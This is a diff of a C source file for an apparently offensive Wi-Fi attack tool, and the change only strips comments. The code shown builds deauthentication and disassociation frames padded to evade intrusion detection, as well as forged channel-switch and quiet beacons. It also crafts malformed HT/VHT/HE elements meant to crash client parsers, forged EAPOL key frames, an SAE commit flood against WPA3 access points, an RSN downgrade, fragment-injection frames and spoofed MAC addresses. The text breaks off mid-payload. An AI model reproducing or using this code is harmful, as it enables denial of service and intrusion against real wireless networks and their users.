@@ -344,23 +344,23 @@ typedef struct {
   int len;
 } pkt_t;
 
-/* PCAP Global Header (for .pcap files) */
+
 typedef struct __attribute__((packed)) {
-  uint32_t magic_number;  /* magic number (0xa1b2c3d4) */
-  uint16_t version_major; /* major version number */
-  uint16_t version_minor; /* minor version number */
-  int32_t  thiszone;      /* GMT to local correction */
-  uint32_t sigfigs;       /* accuracy of timestamps */
-  uint32_t snaplen;       /* max length of captured packets, in octets */
-  uint32_t network;       /* data link type (105 for 802.11) */
+  uint32_t magic_number;  
+  uint16_t version_major; 
+  uint16_t version_minor; 
+  int32_t  thiszone;      
+  uint32_t sigfigs;       
+  uint32_t snaplen;       
+  uint32_t network;       
 } pcap_hdr_t;
 
-/* PCAP Packet Header */
+
 typedef struct __attribute__((packed)) {
-  uint32_t ts_sec;   /* timestamp seconds */
-  uint32_t ts_usec;  /* timestamp microseconds */
-  uint32_t incl_len; /* number of octets of packet saved in file */
-  uint32_t orig_len; /* actual length of packet */
+  uint32_t ts_sec;   
+  uint32_t ts_usec;  
+  uint32_t incl_len; 
+  uint32_t orig_len; 
 } pcaprec_hdr_t;
 
 /* ============================================================
@@ -381,7 +381,7 @@ static uint64_t mono_us(void) {
     ts = (uint64_t)real_ts.tv_sec * 1000000ULL +
          (uint64_t)(real_ts.tv_nsec / 1000);
   }
-  ts += 100; /* Increment 100us per call, bypassing syscall overhead */
+  ts += 100; 
   return ts;
 }
 
@@ -443,32 +443,31 @@ static void rand_mac(uint8_t o[6]) {
 
   /* [FIX] OUI-Aware Realistic MAC Spoofing (Bypass IDS/WIPS) */
   static const uint8_t REAL_OUIS[][3] = {
-      {0x00, 0x14, 0x22}, /* Dell */
-      {0x00, 0x24, 0xD7}, /* Intel */
-      {0x0C, 0x4D, 0xE9}, /* Apple */
-      {0x18, 0x3D, 0xA2}, /* Samsung */
-      {0x30, 0x39, 0x26}, /* Broadcom */
-      {0x48, 0x4B, 0xAA}, /* Cisco */
-      {0x50, 0xCC, 0xF8}, /* Lenovo */
-      {0x90, 0xB6, 0x86}, /* Google */
+      {0x00, 0x14, 0x22}, 
+      {0x00, 0x24, 0xD7}, 
+      {0x0C, 0x4D, 0xE9}, 
+      {0x18, 0x3D, 0xA2}, 
+      {0x30, 0x39, 0x26}, 
+      {0x48, 0x4B, 0xAA}, 
+      {0x50, 0xCC, 0xF8}, 
+      {0x90, 0xB6, 0x86}, 
   };
   const int n_ouis = sizeof(REAL_OUIS) / sizeof(REAL_OUIS[0]);
 
   uint64_t r = xs64_next(&rng);
   int oui_idx = (int)(r % n_ouis);
 
-  /* First 3 bytes are real OUI */
+  
   o[0] = REAL_OUIS[oui_idx][0];
   o[1] = REAL_OUIS[oui_idx][1];
   o[2] = REAL_OUIS[oui_idx][2];
 
-  /* Last 3 bytes are random */
+  
   o[3] = (uint8_t)((r >> 8) & 0xFF);
   o[4] = (uint8_t)((r >> 16) & 0xFF);
   o[5] = (uint8_t)((r >> 24) & 0xFF);
 
-  /* Ensure Locally Administered bit is CLEARED (so it looks like a real factory
-   * MAC) and Multicast bit is CLEARED (Unicast). */
+  
   o[0] &= 0xFC;
 }
 
@@ -555,7 +554,7 @@ static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 #define FC_DEAUTH 0x00C0
 #define FC_DISASSOC 0x00A0
 #define FC_ACTION 0x00D0
-#define FC_CTS 0x00C4       /* Control: Clear To Send */
+#define FC_CTS 0x00C4       
 #define FC_DATA_TODS 0x0108 /* [FIX 5] Data frame with ToDS */
 
 /* [FIX 47] Zero-copy byte offsets for in-place template modification.
@@ -563,11 +562,11 @@ static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  *   rt_hdr_t  = 10 bytes (ver:1 + pad:1 + len:2 + present:4 + tx_flags:2)
  *   dot11_t   = 24 bytes (fc:2 + dur:2 + a1:6 + a2:6 + a3:6 + seq:2)
  * All offsets are from buffer[0]. */
-#define OFF_A1 (sizeof(rt_hdr_t) + offsetof(dot11_t, a1))   /* 10 + 4  = 14 */
-#define OFF_A2 (sizeof(rt_hdr_t) + offsetof(dot11_t, a2))   /* 10 + 10 = 20 */
-#define OFF_A3 (sizeof(rt_hdr_t) + offsetof(dot11_t, a3))   /* 10 + 16 = 26 */
-#define OFF_SEQ (sizeof(rt_hdr_t) + offsetof(dot11_t, seq)) /* 10 + 22 = 32 */
-#define OFF_BODY (sizeof(rt_hdr_t) + sizeof(dot11_t))       /* 10 + 24 = 34 */
+#define OFF_A1 (sizeof(rt_hdr_t) + offsetof(dot11_t, a1))   
+#define OFF_A2 (sizeof(rt_hdr_t) + offsetof(dot11_t, a2))   
+#define OFF_A3 (sizeof(rt_hdr_t) + offsetof(dot11_t, a3))   
+#define OFF_SEQ (sizeof(rt_hdr_t) + offsetof(dot11_t, seq)) 
+#define OFF_BODY (sizeof(rt_hdr_t) + sizeof(dot11_t))       
 
 /* [FIX 4] TX_FLAGS = NOACK(0x0008) | NOSEQ(0x0010) */
 static int mk_rt(uint8_t *b) {
@@ -599,7 +598,7 @@ static int mk_probe_req(uint8_t *b, const uint8_t bss[6], const char *target_ssi
                 0);
   
   if (target_ssid && target_ssid[0]) {
-    /* Targeted SSID IE */
+    
     int sl = (int)strlen(target_ssid);
     if (sl > MAX_SSID_LEN) sl = MAX_SSID_LEN;
     b[o++] = 0;
@@ -607,12 +606,12 @@ static int mk_probe_req(uint8_t *b, const uint8_t bss[6], const char *target_ssi
     memcpy(b + o, target_ssid, sl);
     o += sl;
   } else {
-    /* Wildcard SSID IE (ID=0, len=0) */
+    
     b[o++] = 0;
     b[o++] = 0;
   }
   
-  /* Supported rates IE (ID=1, len=8) */
+  
   b[o++] = 1;
   b[o++] = 8;
   b[o++] = 0x82;
@@ -647,7 +646,7 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   f->cap = htole16(0x0031);
   o += sizeof(beacon_fix_t);
 
-  /* SSID IE */
+  
   int sl = (int)strlen(ssid);
   if (sl > MAX_SSID_LEN)
     sl = MAX_SSID_LEN;
@@ -659,7 +658,7 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   /* [FIX] DS Parameter Set IE must reflect current operating channel */
   o += mk_ds_ie(b + o, cur_ch);
 
-  /* CSA IE (ID=37, len=3) */
+  
   b[o++] = 37;
   b[o++] = 3;
   csa_ie_t *c = (csa_ie_t *)(b + o);
@@ -671,17 +670,17 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) for modern 5GHz/WiFi6 clients */
   b[o++] = 60;
   b[o++] = 4;
-  b[o++] = 1; /* switch mode */
-  b[o++] = new_ch <= 14 ? 81 : 115; /* operating class (81=2.4G, 115=5G) */
+  b[o++] = 1; 
+  b[o++] = new_ch <= 14 ? 81 : 115; 
   b[o++] = new_ch;
-  b[o++] = count; /* switch count */
+  b[o++] = count; 
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
   b[o++] = 40;
   b[o++] = 6;
-  b[o++] = 1; /* quiet count */
-  b[o++] = 1; /* quiet period */
-  uint16_t qdur = htole16(100); /* 100 TU radio silence */
+  b[o++] = 1; 
+  b[o++] = 1; 
+  uint16_t qdur = htole16(100); 
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
@@ -690,45 +689,45 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
    * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
    * ========================================================================= */
 
-  /* 1. IE 61 (HT Operation - Wi-Fi 4): Invalid Secondary Channel Offset */
+  
   b[o++] = 61;
   b[o++] = 22;
   b[o++] = cur_ch;
-  b[o++] = 0x03; /* reserved/invalid secondary channel offset -> integer overflow */
-  for (int i = 0; i < 20; i++) b[o++] = 0x00; /* pad rest of HT operation */
+  b[o++] = 0x03; 
+  for (int i = 0; i < 20; i++) b[o++] = 0x00; 
 
-  /* 2. IE 192 (VHT Operation - Wi-Fi 5): 160MHz out-of-bounds */
+  
   b[o++] = 192;
   b[o++] = 5;
-  b[o++] = 2;   /* Channel Width: 160 MHz */
-  b[o++] = 255; /* Center Freq 1: Out of Bounds */
-  b[o++] = 255; /* Center Freq 2: Out of Bounds */
-  b[o++] = 0xff; /* Basic MCS Set */
+  b[o++] = 2;   
+  b[o++] = 255; 
+  b[o++] = 255; 
+  b[o++] = 0xff; 
   b[o++] = 0xff;
 
-  /* 3. IE 255 Ext 36 (HE Operation - Wi-Fi 6): BSS Color collision/corruption */
-  b[o++] = 255; /* Element ID Extension */
+  
+  b[o++] = 255; 
   b[o++] = 6;
-  b[o++] = 36;  /* Ext ID: HE Operation */
-  b[o++] = 0x00; /* HE MAC Parameters */
+  b[o++] = 36;  
+  b[o++] = 0x00; 
   b[o++] = 0x00;
   b[o++] = 0x00;
-  b[o++] = 0x3f; /* Max BSS Color + Partial BSS Color flag (malformed) */
+  b[o++] = 0x3f; 
   b[o++] = 0x00;
 
   /* =========================================================================
    * [UPGRADE] RSN Downgrade Poisoning (WPA3 Self-Banishment)
    * Advertises WPA-TKIP to trigger client-side KRACK protection lockouts
    * ========================================================================= */
-  b[o++] = 48; /* RSN IE */
+  b[o++] = 48; 
   b[o++] = 20;
-  b[o++] = 0x01; b[o++] = 0x00; /* Version 1 */
-  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* Group Cipher: TKIP (02) - Highly deprecated */
-  b[o++] = 0x01; b[o++] = 0x00; /* Pairwise Cipher Count: 1 */
-  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* Pairwise Cipher: TKIP (02) */
-  b[o++] = 0x01; b[o++] = 0x00; /* AKM Count: 1 */
-  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* AKM: PSK (02) */
-  b[o++] = 0x00; b[o++] = 0x00; /* RSN Capabilities */
+  b[o++] = 0x01; b[o++] = 0x00; 
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
+  b[o++] = 0x01; b[o++] = 0x00; 
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
+  b[o++] = 0x01; b[o++] = 0x00; 
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
+  b[o++] = 0x00; b[o++] = 0x00; 
 
   return o;
 }
@@ -756,7 +755,7 @@ static int mk_quiet_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   /* [FIX 6] DS Parameter Set IE */
   o += mk_ds_ie(b + o, cur_ch);
 
-  /* Quiet IE (ID=40, len=6) */
+  
   b[o++] = 40;
   b[o++] = 6;
   quiet_ie_t *q = (quiet_ie_t *)(b + o);
@@ -778,13 +777,13 @@ static int mk_deauth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   o += 2;
 
   /* [UPGRADE] Variable Length WIPS Evasion Padding based on seq */
-  uint8_t pad_len = 7 + (seq % 16); /* Padding length varies between 7 and 22 bytes */
+  uint8_t pad_len = 7 + (seq % 16); 
   b[o++] = 221;
   b[o++] = pad_len;
-  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
-  b[o++] = 0x02; /* OUI Type */
+  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; 
+  b[o++] = 0x02; 
   for (int i = 0; i < pad_len - 4; i++) {
-      b[o++] = (uint8_t)(seq + i); /* Dynamic dummy data */
+      b[o++] = (uint8_t)(seq + i); 
   }
 
   return o;
@@ -803,10 +802,10 @@ static int mk_deauth_rev(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   uint8_t pad_len = 7 + (seq % 16);
   b[o++] = 221;
   b[o++] = pad_len;
-  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
-  b[o++] = 0x02; /* OUI Type */
+  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; 
+  b[o++] = 0x02; 
   for (int i = 0; i < pad_len - 4; i++) {
-      b[o++] = (uint8_t)(seq + i); /* Dynamic dummy data */
+      b[o++] = (uint8_t)(seq + i); 
   }
 
   return o;
@@ -825,10 +824,10 @@ static int mk_disassoc(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   uint8_t pad_len = 7 + (seq % 16);
   b[o++] = 221;
   b[o++] = pad_len;
-  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
-  b[o++] = 0x02; /* OUI Type */
+  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; 
+  b[o++] = 0x02; 
   for (int i = 0; i < pad_len - 4; i++) {
-      b[o++] = (uint8_t)(seq + i); /* Dynamic dummy data */
+      b[o++] = (uint8_t)(seq + i); 
   }
 
   return o;
@@ -857,42 +856,42 @@ static int mk_eapol_logoff(uint8_t *b, const uint8_t bss[6],
    * instantly desynchronizing their temporal keys and causing all
    * subsequent legitimate encrypted traffic to be dropped. */
   eapol_t *e = (eapol_t *)(b + o);
-  e->ver = 2; /* 802.1X-2004 */
-  e->type = 3; /* EAPOL-Key */
-  e->len = htons(95); /* Key descriptor length (95 bytes) */
+  e->ver = 2; 
+  e->type = 3; 
+  e->len = htons(95); 
   o += sizeof(eapol_t);
 
-  /* EAPOL-Key Descriptor */
-  b[o++] = 254; /* Descriptor Type: WPA2/WPA3 */
   
-  /* Key Information (2 bytes): Key MIC, Secure, Error, Request, Encrypted Key Data, SMK Message */
-  uint16_t key_info = htole16(0x008A); /* Message 1: Pairwise, Ack, MIC */
+  b[o++] = 254; 
+  
+  
+  uint16_t key_info = htole16(0x008A); 
   memcpy(b + o, &key_info, 2); o += 2;
   
-  /* Key Length (2 bytes): AES-CCMP is 16 bytes */
+  
   uint16_t key_len = htole16(16);
   memcpy(b + o, &key_len, 2); o += 2;
   
-  /* Replay Counter (8 bytes) */
-  uint64_t replay_ctr = htole64(mono_us()); /* High entropy replay counter */
+  
+  uint64_t replay_ctr = htole64(mono_us()); 
   memcpy(b + o, &replay_ctr, 8); o += 8;
   
-  /* Key Nonce (ANonce) - 32 bytes of pure poison */
-  for (int i = 0; i < 32; i++) b[o++] = (uint8_t)(mono_us() & 0xFF); /* Randomize ANonce */
   
-  /* Key IV (16 bytes) - 0 */
+  for (int i = 0; i < 32; i++) b[o++] = (uint8_t)(mono_us() & 0xFF); 
+  
+  
   memset(b + o, 0, 16); o += 16;
   
-  /* Key RSC (8 bytes) - 0 */
+  
   memset(b + o, 0, 8); o += 8;
   
-  /* Key ID (8 bytes) - 0 */
+  
   memset(b + o, 0, 8); o += 8;
   
-  /* Key MIC (16 bytes) - 0 (dummy) */
+  
   memset(b + o, 0, 16); o += 16;
   
-  /* Key Data Length (2 bytes) - 0 */
+  
   uint16_t key_data_len = 0;
   memcpy(b + o, &key_data_len, 2); o += 2;
   
@@ -904,30 +903,30 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   int o = 0;
   o += mk_rt(b + o);
   o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
-  b[o++] = 0; /* category: Spectrum Management */
-  b[o++] = 4; /* action: Channel Switch Announcement */
+  b[o++] = 0; 
+  b[o++] = 4; 
   
-  /* CSA IE embedded in action body (ID=37, len=3, per 802.11-2020 §9.6.2.6) */
+  
   b[o++] = 37;
   b[o++] = 3;
-  b[o++] = 1; /* switch mode */
+  b[o++] = 1; 
   b[o++] = new_ch;
-  b[o++] = count; /* switch count */
+  b[o++] = count; 
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) piggybacked */
   b[o++] = 60;
   b[o++] = 4;
-  b[o++] = 1; /* switch mode */
-  b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
+  b[o++] = 1; 
+  b[o++] = new_ch <= 14 ? 81 : 115; 
   b[o++] = new_ch;
-  b[o++] = count; /* switch count */
+  b[o++] = count; 
 
   /* [UPGRADE] Piggybacked Quiet Element (ID=40, len=6) to enforce radio silence */
   b[o++] = 40;
   b[o++] = 6;
-  b[o++] = 1; /* quiet count */
-  b[o++] = 1; /* quiet period */
-  uint16_t qdur = htole16(100); /* 100 TU radio silence */
+  b[o++] = 1; 
+  b[o++] = 1; 
+  uint16_t qdur = htole16(100); 
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
@@ -936,30 +935,30 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
    * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
    * ========================================================================= */
 
-  /* 1. IE 61 (HT Operation - Wi-Fi 4): Invalid Secondary Channel Offset */
+  
   b[o++] = 61;
   b[o++] = 22;
-  b[o++] = new_ch; /* For Action frame, we use the destination channel */
-  b[o++] = 0x03; /* reserved/invalid secondary channel offset -> integer overflow */
-  for (int i = 0; i < 20; i++) b[o++] = 0x00; /* pad rest of HT operation */
+  b[o++] = new_ch; 
+  b[o++] = 0x03; 
+  for (int i = 0; i < 20; i++) b[o++] = 0x00; 
 
-  /* 2. IE 192 (VHT Operation - Wi-Fi 5): 160MHz out-of-bounds */
+  
   b[o++] = 192;
   b[o++] = 5;
-  b[o++] = 2;   /* Channel Width: 160 MHz */
-  b[o++] = 255; /* Center Freq 1: Out of Bounds */
-  b[o++] = 255; /* Center Freq 2: Out of Bounds */
-  b[o++] = 0xff; /* Basic MCS Set */
+  b[o++] = 2;   
+  b[o++] = 255; 
+  b[o++] = 255; 
+  b[o++] = 0xff; 
   b[o++] = 0xff;
 
-  /* 3. IE 255 Ext 36 (HE Operation - Wi-Fi 6): BSS Color collision/corruption */
-  b[o++] = 255; /* Element ID Extension */
+  
+  b[o++] = 255; 
   b[o++] = 6;
-  b[o++] = 36;  /* Ext ID: HE Operation */
-  b[o++] = 0x00; /* HE MAC Parameters */
+  b[o++] = 36;  
+  b[o++] = 0x00; 
   b[o++] = 0x00;
   b[o++] = 0x00;
-  b[o++] = 0x3f; /* Max BSS Color + Partial BSS Color flag (malformed) */
+  b[o++] = 0x3f; 
   b[o++] = 0x00;
 
   return o;
@@ -1001,17 +1000,17 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) */
   b[o++] = 60;
   b[o++] = 4;
-  b[o++] = 1; /* switch mode */
-  b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
+  b[o++] = 1; 
+  b[o++] = new_ch <= 14 ? 81 : 115; 
   b[o++] = new_ch;
-  b[o++] = count; /* switch count */
+  b[o++] = count; 
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
   b[o++] = 40;
   b[o++] = 6;
-  b[o++] = 1; /* quiet count */
-  b[o++] = 1; /* quiet period */
-  uint16_t qdur = htole16(100); /* 100 TU radio silence */
+  b[o++] = 1; 
+  b[o++] = 1; 
+  uint16_t qdur = htole16(100); 
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
@@ -1020,45 +1019,45 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
    * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
    * ========================================================================= */
 
-  /* 1. IE 61 (HT Operation - Wi-Fi 4): Invalid Secondary Channel Offset */
+  
   b[o++] = 61;
   b[o++] = 22;
   b[o++] = cur_ch;
-  b[o++] = 0x03; /* reserved/invalid secondary channel offset -> integer overflow */
-  for (int i = 0; i < 20; i++) b[o++] = 0x00; /* pad rest of HT operation */
+  b[o++] = 0x03; 
+  for (int i = 0; i < 20; i++) b[o++] = 0x00; 
 
-  /* 2. IE 192 (VHT Operation - Wi-Fi 5): 160MHz out-of-bounds */
+  
   b[o++] = 192;
   b[o++] = 5;
-  b[o++] = 2;   /* Channel Width: 160 MHz */
-  b[o++] = 255; /* Center Freq 1: Out of Bounds */
-  b[o++] = 255; /* Center Freq 2: Out of Bounds */
-  b[o++] = 0xff; /* Basic MCS Set */
+  b[o++] = 2;   
+  b[o++] = 255; 
+  b[o++] = 255; 
+  b[o++] = 0xff; 
   b[o++] = 0xff;
 
-  /* 3. IE 255 Ext 36 (HE Operation - Wi-Fi 6): BSS Color collision/corruption */
-  b[o++] = 255; /* Element ID Extension */
+  
+  b[o++] = 255; 
   b[o++] = 6;
-  b[o++] = 36;  /* Ext ID: HE Operation */
-  b[o++] = 0x00; /* HE MAC Parameters */
+  b[o++] = 36;  
+  b[o++] = 0x00; 
   b[o++] = 0x00;
   b[o++] = 0x00;
-  b[o++] = 0x3f; /* Max BSS Color + Partial BSS Color flag (malformed) */
+  b[o++] = 0x3f; 
   b[o++] = 0x00;
 
   /* =========================================================================
    * [UPGRADE] RSN Downgrade Poisoning (WPA3 Self-Banishment)
    * Advertises WPA-TKIP to trigger client-side KRACK protection lockouts
    * ========================================================================= */
-  b[o++] = 48; /* RSN IE */
+  b[o++] = 48; 
   b[o++] = 20;
-  b[o++] = 0x01; b[o++] = 0x00; /* Version 1 */
-  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* Group Cipher: TKIP (02) - Highly deprecated */
-  b[o++] = 0x01; b[o++] = 0x00; /* Pairwise Cipher Count: 1 */
-  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* Pairwise Cipher: TKIP (02) */
-  b[o++] = 0x01; b[o++] = 0x00; /* AKM Count: 1 */
-  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* AKM: PSK (02) */
-  b[o++] = 0x00; b[o++] = 0x00; /* RSN Capabilities */
+  b[o++] = 0x01; b[o++] = 0x00; 
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
+  b[o++] = 0x01; b[o++] = 0x00; 
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
+  b[o++] = 0x01; b[o++] = 0x00; 
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
+  b[o++] = 0x00; b[o++] = 0x00; 
 
   return o;
 }
@@ -1071,21 +1070,21 @@ static int mk_auth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
    * Changes Auth Algo to SAE (3) and injects a dummy ECC payload.
    * This forces the AP to perform expensive cryptographic elliptic curve
    * operations, overwhelming the CPU of WPA3 hotspots. */
-  uint16_t algo = htole16(3); /* Auth Algo 3: SAE */
-  uint16_t seq = htole16(1);  /* Auth Seq 1: SAE Commit */
-  uint16_t status = htole16(0); /* Status: Success */
+  uint16_t algo = htole16(3); 
+  uint16_t seq = htole16(1);  
+  uint16_t status = htole16(0); 
   memcpy(b + o, &algo, 2); o += 2;
   memcpy(b + o, &seq, 2); o += 2;
   memcpy(b + o, &status, 2); o += 2;
   
-  /* Dummy SAE Commit Payload (ECC Group 19 - 256 bit) */
+  
   uint16_t group_id = htole16(19);
   memcpy(b + o, &group_id, 2); o += 2;
   
-  /* Fake Scalar (32 bytes) */
+  
   for (int i = 0; i < 32; i++) b[o++] = 0xAA;
   
-  /* Fake Element (64 bytes for uncompressed ECC point) */
+  
   for (int i = 0; i < 64; i++) b[o++] = 0xBB;
   return o;
 }
@@ -1095,14 +1094,14 @@ static int mk_delba(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
   int o = 0;
   o += mk_rt(b + o);
   o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
-  b[o++] = 3; /* category: Block Ack */
-  b[o++] = 2; /* action: DELBA */
-  /* DELBA params offset is exactly 32 (rt=10 + dot11=24 + cat/act=2) */
+  b[o++] = 3; 
+  b[o++] = 2; 
+  
   /* [FIX 9] DELBA params: bit 11 = initiator, bits 12-15 = TID */
-  uint16_t params = htole16(0x0800); /* initiator=1, TID=0 */
+  uint16_t params = htole16(0x0800); 
   memcpy(b + o, &params, 2);
   o += 2;
-  uint16_t reason = htole16(39); /* Mechanism not setup */
+  uint16_t reason = htole16(39); 
   memcpy(b + o, &reason, 2);
   o += 2;
   return o;
@@ -1145,64 +1144,47 @@ static int mk_confusion_beacon(uint8_t *b, const char *ssid, uint8_t cur_ch) {
  *  Reference: Mathy Vanhoef, "Fragment and Forge" (USENIX 2021)
  * ============================================================ */
 
-/* FC flags for fragmentation */
-#define FC_DATA_TODS_MOREFRAG 0x0508 /* Data + ToDS + MoreFragments */
 
-/*
- * mk_frag_setup — Fragment 0 (setup fragment, MoreFragments=1)
- *
- * Frame structure:
- *   [RadioTap] [802.11 Data ToDS+MoreFrag, frag=0] [LLC/SNAP→0x0800] [ARP
- * partial]
- *
- * The LLC/SNAP header declares IPv4 (0x0800) but the actual payload
- * is crafted to be completed by Fragment 1. Because many receivers
- * don't verify that all fragments share the same PN/encryption state,
- * Fragment 1 can inject arbitrary plaintext content.
- */
+#define FC_DATA_TODS_MOREFRAG 0x0508 
+
+
 static int mk_frag_setup(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                          uint16_t seq) {
   int o = 0;
   o += mk_rt(b + o);
 
-  /* 802.11 header: Data frame, ToDS=1, MoreFragments=1 */
+  
   dot11_t *h = (dot11_t *)(b + o);
   h->fc = htole16(FC_DATA_TODS_MOREFRAG);
   h->dur = 0;
-  /* ToDS addressing: addr1=BSSID(RA), addr2=SA(client), addr3=DA(BSSID) */
+  
   memcpy(h->a1, bss, 6);
   memcpy(h->a2, cli, 6);
   memcpy(h->a3, bss, 6);
-  /* Sequence Control: seq_num in bits[4:15], frag_num=0 in bits[0:3] */
-  h->seq = htole16((seq << 4) | 0); /* fragment 0 */
+  
+  h->seq = htole16((seq << 4) | 0); 
   o += sizeof(dot11_t);
 
-  /* LLC/SNAP header declaring IPv4 (EtherType 0x0800) */
+  
   llc_snap_t *l = (llc_snap_t *)(b + o);
   l->dsap = 0xAA;
   l->ssap = 0xAA;
   l->ctrl = 0x03;
   memset(l->oui, 0, 3);
-  l->type = htons(0x0800); /* IPv4 */
+  l->type = htons(0x0800); 
   o += sizeof(llc_snap_t);
 
-  /*
-   * Partial ARP-like probe payload (first 14 bytes of an ARP request).
-   * This gets combined with Fragment 1 in the receiver's reassembly buffer.
-   *
-   * ARP header: hw_type(2) + proto_type(2) + hw_len(1) + proto_len(1)
-   *           + opcode(2) + sender_hw(6)
-   */
+  
   uint8_t arp_partial[] = {
       0x00,
-      0x01, /* Hardware type: Ethernet */
+      0x01, 
       0x08,
-      0x00, /* Protocol type: IPv4 */
-      0x06, /* Hardware address length */
-      0x04, /* Protocol address length */
+      0x00, 
+      0x06, 
+      0x04, 
       0x00,
-      0x01, /* Opcode: ARP Request */
-      /* Sender hardware address (spoofed as client) */
+      0x01, 
+      
       cli[0],
       cli[1],
       cli[2],
@@ -1216,104 +1198,81 @@ static int mk_frag_setup(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   return o;
 }
 
-/*
- * mk_frag_payload — Fragment 1 (payload fragment, MoreFragments=0)
- *
- * Frame structure:
- *   [RadioTap] [802.11 Data ToDS, frag=1] [Injected payload bytes]
- *
- * This fragment carries the "tail" of the reassembled frame.
- * Because the receiver stitches it with Fragment 0's LLC/SNAP
- * context, the combined result is processed as a valid IPv4 frame
- * with our injected content — without ever knowing the WPA key.
- *
- * The payload here is a crafted ICMP Echo Request (ping) that,
- * when reassembled, forms a valid IP packet destined to the
- * gateway, proving plaintext injection capability.
- */
+
 static int mk_frag_payload(uint8_t *b, const uint8_t bss[6],
                            const uint8_t cli[6], uint16_t seq,
                            const uint8_t *payload, int payload_len) {
   int o = 0;
   o += mk_rt(b + o);
 
-  /* 802.11 header: Data frame, ToDS=1, MoreFragments=0 (last frag) */
+  
   dot11_t *h = (dot11_t *)(b + o);
-  h->fc = htole16(FC_DATA_TODS); /* No MoreFrag — this is the final fragment */
+  h->fc = htole16(FC_DATA_TODS); 
   h->dur = 0;
   memcpy(h->a1, bss, 6);
   memcpy(h->a2, cli, 6);
   memcpy(h->a3, bss, 6);
-  /* Same sequence number as Fragment 0, but frag_num=1 */
-  h->seq = htole16((seq << 4) | 1); /* fragment 1 */
+  
+  h->seq = htole16((seq << 4) | 1); 
   o += sizeof(dot11_t);
 
-  /*
-   * Injected payload — completes the ARP started in Fragment 0.
-   * This contains: sender_ip(4) + target_hw(6) + target_ip(4)
-   * plus an ICMP echo request probe that the AP will forward.
-   *
-   * When the two fragments are reassembled in the victim's RAM:
-   *   Fragment 0: [LLC/SNAP→IPv4] [ARP hw_type..sender_hw]
-   *   Fragment 1: [sender_ip..target_ip] [ICMP probe]
-   * = Complete ARP request + ICMP injection
-   */
+  
   if (payload && payload_len > 0) {
     int copy_len =
         payload_len > MAX_FRAG_PAYLOAD ? MAX_FRAG_PAYLOAD : payload_len;
     memcpy(b + o, payload, copy_len);
     o += copy_len;
   } else {
-    /* Default payload: ARP completion + ICMP echo probe */
+    
     uint8_t default_payload[] = {
-        /* Sender IP: 192.168.1.100 (spoofed) */
+        
         0xC0,
         0xA8,
         0x01,
         0x64,
-        /* Target hardware address: broadcast */
+        
         0xFF,
         0xFF,
         0xFF,
         0xFF,
         0xFF,
         0xFF,
-        /* Target IP: 192.168.1.1 (gateway probe) */
+        
         0xC0,
         0xA8,
         0x01,
         0x01,
         /* === ICMP Echo Request (injected command channel) === */
